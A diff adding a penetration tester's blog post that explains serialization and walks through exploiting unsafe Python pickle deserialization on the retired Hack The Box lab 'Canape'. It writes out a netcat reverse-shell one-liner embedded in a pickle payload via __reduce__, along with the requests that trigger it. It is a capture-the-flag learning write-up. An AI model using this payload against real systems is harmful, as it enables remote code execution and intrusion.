@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+
+
+
+
+    <title>Deserialization – alex fox – penetration tester</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="What is Deserialization?
+
+" />
+    <meta property="og:description" content="What is Deserialization?
+
+" />
+    
+    <meta name="author" content="alex fox" />
+
+    
+    <meta property="og:title" content="Deserialization" />
+    <meta property="twitter:title" content="Deserialization" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="alternate" type="application/rss+xml" title="alex fox - penetration tester" href="/feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="/" class="site-avatar"><img src="https://avatars0.githubusercontent.com/u/4664386?s=460&u=bb9aadc79501e5331befad1b55f057ffb59277a1&v=4" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="/">alex fox</a></h1>
+            <p class="site-description">penetration tester</p>
+          </div>
+
+          <nav>
+            <a href="/blog">blog</a>
+            <a href="/about">about</a>
+          </nav>
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>Deserialization</h1>
+
+  <div class="entry">
+    <p>What is Deserialization?</p>
+
+<p>Modern applications are often decentralized and as such, utilize multiple components (such as microservices) which often talk to one another and share and store data. Serialization is used to convert an object into something that can be shared across a network or stored in a file.</p>
+
+<p>For example, JSON is a popular choice for serializing complex data objects into simple strings so that they might be transported or stored. The restoration of serialized data back into their complex object form is known as deserialization.</p>
+
+<p>We first need to require ruby’s <b>“json”</b> module.</p>
+
+<figure class="highlight"><pre><code class="language-rb" data-lang="rb"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nb">require</span> <span class="s1">'json'</span>
+<span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">003</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">glanton_gang</span> <span class="o">=</span> <span class="p">{</span><span class="ss">newbie: </span><span class="s2">"the kid"</span><span class="p">,</span> <span class="ss">outlaw: </span><span class="s2">"toadvine"</span><span class="p">,</span> <span class="ss">priest: </span><span class="s2">"tobin"</span><span class="p">,</span> <span class="ss">captain: </span><span class="s2">"glanton"</span><span class="p">,</span> <span class="ss">devil: </span><span class="s2">"the judge"</span><span class="p">}</span>
+<span class="o">=&gt;</span> <span class="p">{</span><span class="ss">:newbie</span><span class="o">=&gt;</span><span class="s2">"the kid"</span><span class="p">,</span> <span class="ss">:outlaw</span><span class="o">=&gt;</span><span class="s2">"toadvine"</span><span class="p">,</span> <span class="ss">:priest</span><span class="o">=&gt;</span><span class="s2">"tobin"</span><span class="p">,</span> <span class="ss">:captain</span><span class="o">=&gt;</span><span class="s2">"glanton"</span><span class="p">,</span> <span class="ss">:devil</span><span class="o">=&gt;</span><span class="s2">"the judge"</span><span class="p">}</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">004</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">glanton_gang</span><span class="p">.</span><span class="nf">class</span>
+<span class="o">=&gt;</span> <span class="no">Hash</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">005</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">glanton_gang_json</span> <span class="o">=</span> <span class="n">glanton_gang</span><span class="p">.</span><span class="nf">to_json</span>
+<span class="o">=&gt;</span> <span class="s2">"{</span><span class="se">\"</span><span class="s2">newbie</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">the kid</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">outlaw</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">toadvine</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">priest</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">tobin</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">captain</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">glanton</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">devil</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">the judge</span><span class="se">\"</span><span class="s2">}"</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">006</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">glanton_gang_json</span><span class="p">.</span><span class="nf">class</span>
+<span class="o">=&gt;</span> <span class="no">String</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">007</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span></code></pre></figure>
+
+<p>This is a straightforward example of serialization, in which our data object of a hash is being converted into strings by way of the <b>to_json</b> method. This makes our data language agnostic and ready to be stored in a file.</p>
+
+<p>Serialization is common in architectures that include APIs, microservices, and client-side MVC. When the data being serialized is trusted (such as, by the system), there is no issue. However, when a user can control or modify input, deserialization vulnerabilities can arise. The conversion back from string (or whatever form the serialized data is stored as) to binary can be tampered with and result in remote code execution. It’s important to note that not all forms of serialization involve serializing to strings, for example, one method of serializing data in python uses the <b>pickle</b> module.</p>
+
+<p>Let’s take a look at the Python docs. Python’s <a href="https://docs.python.org/3/library/pickle.html">pickle module</a> implements binary protocol for serializing and deserializing a python object. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. In other words, pickling == serializing and depickling == deserializing.</p>
+
+<h3>Unsafe Deserialization: HTB's <i>Canape</i></h3>
+
+<p>We are going to be examining a small portion of the retired hackthebox (HTB) box <b>“Canape”</b>, which contains a vulnerable pickle function that deserializes unsanitized user data. The box in question is hosting a flask application on port 80, and after running a gobuster scan with a lengthy wordlist we discover the git configuration file. We add this git subdomain to our /etc/hosts file and then we can view the flask app’s git repository. This will inform us on what’s going on behind the scenes and how to craft our exploit.</p>
+
+<p>The vulnerable page in question:
+<img src="/images/canape/quotes.png" alt="Quotes form submission" /></p>
+
+<p>The vulnerable code in question:
+<img src="/images/canape/pickle-code-vuln.png" alt="Flask app code" /></p>
+
+<p>This is not the full <b>__init__.py</b> file but it contains what we’re interested in. On the webpage we can see that we can submit a Simpsons’ character and a quote. Looking at the code, specifically the “submit” route, we can see that on a form submission the application looks for a character and quote. It then checks if the character is whitelisted. If the submitted character is whitelisted, then the code goes on to process the quote (regardless if the quote is valid; it only checks if the quote is empty or not), and stores the data in a pickle file with an md5 filename.</p>
+
+<p>The dangerous portion of this application is the above combined with the check route, which proceeds to open the file containing the user-submitted character and quote depending on an ‘id’ POST parameter. It then deserializes the user-submitted data by way of <b>cPickle.loads(data)</b>. Thankfully, we know exactly how to name our file: <b>p_id = md5(char + quote).hexidigest()</b>.</p>
+
+<p>So, to recap, we will be taking the following steps to exploit this unsafe deserialization:</p>
+<ol>
+  <li>Submit a valid character name</li>
+  <li>Submit a quote that is actually an os.system command that connects to our local listener</li>
+  <li>The application will load our data using <b>cPickle.loads(data)</b></li>
+  <li>Our exploit is triggered and our listener receives a shell</li>
+</ol>
+
+<p>We look at the vulnerable code as we craft our exploit. We need to import the following libraries:</p>
+<ul>
+  <li>Os: to run system commands</li>
+  <li>Requests: to made requests to the vulnerable flask application</li>
+  <li>Md5: to name our file properly (following the flask app’s file-naming convention)</li>
+  <li>cPickle: <b>cPickle</b> is an optimized version of the pickle module written in C, and it is what our vulnerable application is using, so we will use it in the exploit</li>
+</ul>
+
+<p>Note that there is nothing inherently dangerous about the <b>pickle</b> module, it’s only dangerous when you allow an untrusted source to be pickled/unpickled–as this web application is doing.</p>
+
+<p>Our exploit code:
+<img src="/images/canape/exploit.png" alt="Exploit code" /></p>
+
+<p>A quick examination of our exploit code:</p>
+
+<h6>def __reduce__(self);</h6>
+
+<p><b>pickle</b> allows arbitrary objects to declare how they should be pickled by defining a <strong>reduce</strong> method, which should return either a string or a tuple describing how to reconstruct this object on unpacking.<sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup></p>
+
+<p>We are constructing a pickle that, upon unpickling, will execute:
+<b>homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.29 5555 &gt;/tmp/f</b></p>
+
+<p>For whatever reason I’m partial to the above one-liner, though it’s likely poor practice to assume netcat is on machines. From my previous experience of working on this box, I know the above will execute. However, if this wasn’t the case, there are plenty of other options for getting a shell, including calling upon python’s <b>subprocess</b> module.</p>
+
+<h6>cPickle.dumps</h6>
+<p>Returns the pickled object as a bytes object (meaning, it is serialized).</p>
+
+<h6>char, quote = sc.split(“!”)</h6>
+<p>We are splitting the character and quote on the exclamation point, meaning, everything before the exclamation point is equal to the character (homer), everything after is the quote. We need to do this to adhere to the check performed on the character parameter.</p>
+
+<h6>p_id = md5(char + quote).hexdigest()</h6>
+<p>We are naming our file following the conventions set out in the flask application.</p>
+
+<h6>requests.post('http://10.10.10.70/submit', data={'character': char, 'quote': quote})</h6>
+<p>We are submitting a post request to the submit page, with our character and quote</p>
+
+<h6>requests.post('http://10.10.10.70/check', data={'id': p_id})</h6>
+<p>We are submitting a post request to the vulnerable check page, with the id of our pickled file. This triggers the vulnerable <b>cPickle.loads(data)</b>, which deserializes our data and executes the connection back to our reverse shell.</p>
+
+<p>Now we will run our exploit, and voila, we have a shell!</p>
+
+<p><img src="/images/canape/shell.png" alt="Shell" /></p>
+
+<div class="footnotes">
+  <ol>
+    <li id="fn:1">
+      <p><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">https://blog.nelhage.com/2011/03/exploiting-pickle</a> <a href="#fnref:1" class="reversefootnote">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+  </div>
+
+  <div class="date">
+    Written on June 16, 2020
+  </div>
+
+  
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/foxed"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+  </body>
+</html>
